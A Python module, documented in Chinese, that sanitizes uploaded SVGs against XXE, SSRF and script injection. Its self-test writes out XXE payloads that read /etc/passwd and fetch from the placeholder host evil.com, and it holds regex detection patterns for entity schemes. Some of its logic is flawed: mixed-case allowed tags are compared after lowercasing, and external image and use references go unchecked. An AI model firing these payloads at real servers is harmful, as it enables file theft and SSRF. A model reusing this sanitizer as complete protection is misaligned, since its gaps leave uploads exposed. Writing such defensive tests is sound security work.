"""
xxe_svg_ssrf_fix.py — Blind XXE via SVG Upload → SSRF + Data Exfil Fix

漏洞背景:
- SVG文件上传功能未禁用外部实体解析
- 攻击者可构造包含外部实体的SVG
- 通过OOB技术将服务器文件外带到攻击者控制的服务器
- 修复需要: 禁用XML外部实体解析 + 白名单标签过滤

本模块实现安全的XML/SVG解析，防止XXE攻击。
"""

import io
import re
from dataclasses import dataclass, field
from typing import Any, Dict, Optional, Set
from xml.parsers.expat import ExpatError


class XXEError(Exception):
    """XXE安全异常"""
    pass


# SVG安全限制
SVG_MAX_SIZE = 256 * 1024  # 256KB
SVG_MAX_ELEMENTS = 100

SVG_ALLOWED_ELEMENTS = frozenset({
    "svg", "g", "path", "circle", "rect", "line", "polyline",
    "polygon", "text", "tspan", "defs", "use", "image",
    "linearGradient", "radialGradient", "stop", "clipPath",
    "mask", "filter", "feGaussianBlur", "feOffset", "feBlend",
    "feMerge", "feMergeNode", "feColorMatrix", "feComposite",
    "feComponentTransfer", "feFuncR", "feFuncG", "feFuncB", "feFuncA",
    "animate", "animateTransform", "set", "metadata",
    "style", "symbol", "marker", "pattern",
})

DANGEROUS_ELEMENTS = frozenset({
    "script", "foreignObject", "iframe", "object", "embed",
})


@dataclass
class SVGUploadConfig:
    """SVG上传安全配置"""
    max_file_size: int = SVG_MAX_SIZE
    max_element_count: int = SVG_MAX_ELEMENTS
    allowed_elements: Set[str] = SVG_ALLOWED_ELEMENTS
    block_script_elements: bool = True
    block_foreign_object: bool = True
    allow_external_images: bool = False
    strip_xml_declaration: bool = True


class XXESafeParser:
    """XXE安全解析器 — 禁用外部实体"""
    
    @staticmethod
    def create_safe_xml_parser():
        """
        创建安全的XML解析器
        
        禁用DOCTYPE和外部实体解析。
        """
        try:
            from defusedxml import ElementTree as safe_etree
            return safe_etree
        except ImportError:
            import xml.etree.ElementTree as etree
            return etree
    
    @staticmethod
    def parse_safe(xml_content: str) -> Any:
        """
        安全的XML解析
        
        1. 检测XXE payload
        2. 禁用外部实体
        3. 验证无DTD外部引用
        """
        # 检测XXE payload
        xxe_patterns = [
            (r"<!ENTITY\s+\w+\s+SYSTEM\s+[\"']", "ENTITY SYSTEM"),
            (r"<!ENTITY\s+\w+\s+PUBLIC\s+[\"']", "ENTITY PUBLIC"),
            (r"<!DOCTYPE\s+\w+\s+\[", "DOCTYPE with internal subset"),
            (r"<!ENTITY\s+%\s+\w+\s+SYSTEM", "Parameter ENTITY SYSTEM"),
            (r"<!ENTITY\s+%\s+\w+\s+PUBLIC", "Parameter ENTITY PUBLIC"),
            (r"<!ENTITY\s+\w+\s+[\"']file://", "File entity"),
            (r"<!ENTITY\s+\w+\s+[\"']http://", "HTTP entity"),
            (r"<!ENTITY\s+\w+\s+[\"']https://", "HTTPS entity"),
            (r"<!ENTITY\s+\w+\s+[\"']php://", "PHP entity"),
            (r"<!ENTITY\s+\w+\s+[\"']expect://", "Expect entity"),
            (r"<!ENTITY\s+\w+\s+[\"']data://", "Data entity"),
            (r"<!ENTITY\s+\w+\s+[\"']gopher://", "Gopher entity"),
            (r"<!ENTITY\s+\w+\s+[\"']ftp://", "FTP entity"),
        ]
        
        for pattern, name in xxe_patterns:
            if re.search(pattern, xml_content, re.IGNORECASE):
                raise XXEError(f"XXE detected: {name}")
        
        parser_module = XXESafeParser.create_safe_xml_parser()
        
        try:
            root = parser_module.fromstring(xml_content.encode("utf-8"))
            return root
        except ExpatError as e:
            raise XXEError(f"XML parsing error: {e}") from e
        except Exception as e:
            raise XXEError(f"XML parse failed: {e}") from e


class SVGSanitizer:
    """SVG清理器 — 移除XXE和恶意内容"""
    
    def __init__(self, config: Optional[SVGUploadConfig] = None):
        self.config = config or SVGUploadConfig()
    
    def sanitize_svg(self, svg_content: str) -> str:
        """
        清理SVG内容
        
        1. 检查文件大小
        2. 检测XXE payload
        3. 移除DOCTYPE声明
        4. 验证元素白名单
        5. 移除事件处理器
        """
        if len(svg_content) > self.config.max_file_size:
            raise XXEError(f"SVG too large: {len(svg_content)}")
        
        # 检测并阻止XXE
        XXESafeParser.parse_safe(svg_content)
        
        # 移除DOCTYPE声明（XXE载体）
        cleaned = re.sub(
            r"<!DOCTYPE[^>]*>",
            "",
            svg_content,
            flags=re.IGNORECASE | re.DOTALL,
        )
        
        # 移除XML声明
        if self.config.strip_xml_declaration:
            cleaned = re.sub(
                r"<\?xml[^>]*\?>",
                "",
                cleaned,
                flags=re.IGNORECASE,
            )
        
        # 解析并验证
        parser_module = XXESafeParser.create_safe_xml_parser()
        root = parser_module.fromstring(cleaned.encode("utf-8"))
        
        # 递归验证元素
        self._validate_element(root, depth=0)
        
        # 移除危险内容
        cleaned = self._remove_dangerous_content(cleaned)
        
        return cleaned
    
    def _validate_element(self, element, depth: int = 0):
        """递归验证SVG元素"""
        if depth > 50:
            raise XXEError("SVG element depth exceeds limit")
        
        tag = element.tag.split("}")[-1] if "}" in element.tag else element.tag
        
        if tag.lower() not in self.config.allowed_elements:
            raise XXEError(f"Element '{tag}' not in allowed list")
        
        if tag.lower() in DANGEROUS_ELEMENTS:
            raise XXEError(f"Dangerous element '{tag}' blocked")
        
        for attr_name, attr_value in element.attrib.items():
            self._validate_attribute(attr_name, attr_value)
        
        for child in element:
            self._validate_element(child, depth + 1)
    
    def _validate_attribute(self, name: str, value: str):
        """验证SVG属性安全性"""
        if name.startswith("on") or name.startswith("ON"):
            raise XXEError(f"Event handler '{name}' blocked")
        
        if value.lower().startswith("javascript:"):
            raise XXEError("JavaScript URL in attribute blocked")
        
        if value.lower().startswith("data:"):
            raise XXEError("Data URL in attribute blocked")
    
    def _remove_dangerous_content(self, svg: str) -> str:
        """移除危险内容"""
        svg = re.sub(
            r'\s+on\w+\s*=\s*["\'][^"\']*["\']',
            "",
            svg,
            flags=re.IGNORECASE,
        )
        svg = re.sub(
            r'(href|xlink:href)\s*=\s*["\']javascript:[^"\']*["\']',
            "",
            svg,
            flags=re.IGNORECASE,
        )
        return svg


if __name__ == "__main__":
    sanitizer = SVGSanitizer()
    
    # 安全SVG
    safe_svg = """<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
    <circle cx="50" cy="50" r="40" fill="blue"/>
</svg>"""
    
    try:
        result = sanitizer.sanitize_svg(safe_svg)
        print(f"Safe SVG: {len(result)} chars")
    except XXEError as e:
        print(f"Safe SVG ERROR: {e}")
    
    # XXE测试
    xxe_payloads = [
        ('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>', "File XXE"),
        ('<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/data">]>', "HTTP XXE"),
        ('<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.com/ext.dtd">%xxe;]>', "Blind OOB XXE"),
    ]
    
    for payload, name in xxe_payloads:
        svg = f'<?xml version="1.0"?>{payload}<svg xmlns="http://www.w3.org/2000/svg"/>'
        try:
            sanitizer.sanitize_svg(svg)
            print(f"{name}: SHOULD BE BLOCKED")
        except XXEError as e:
            print(f"{name}: BLOCKED - {str(e)[:40]}")
    
    print("\nXXE Prevention Features:")
    print("- DOCTYPE/ENTITY pattern detection")
    print("- Safe XML parser (defusedxml)")
    print("- SVG element whitelist")
    print("- Event handler removal")
    print("- External resource control")
    print("- OOB XXE detection")
